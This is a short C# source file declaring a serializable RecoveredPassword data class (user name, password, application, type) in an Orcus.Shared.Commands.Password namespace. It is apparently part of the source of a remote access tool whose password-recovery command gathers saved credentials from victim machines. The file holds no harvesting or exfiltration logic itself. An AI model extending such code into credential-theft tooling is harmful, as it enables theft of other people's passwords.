using System;

namespace Orcus.Shared.Commands.Password
{
    [Serializable]
    public class RecoveredPassword
    {
        public string UserName { get; set; }
        public string Password { get; set; }
        public string Field1 { get; set; }
        public string Field2 { get; set; }
        public string Application { get; set; }
        public PasswordType PasswordType { get; set; }
    }
}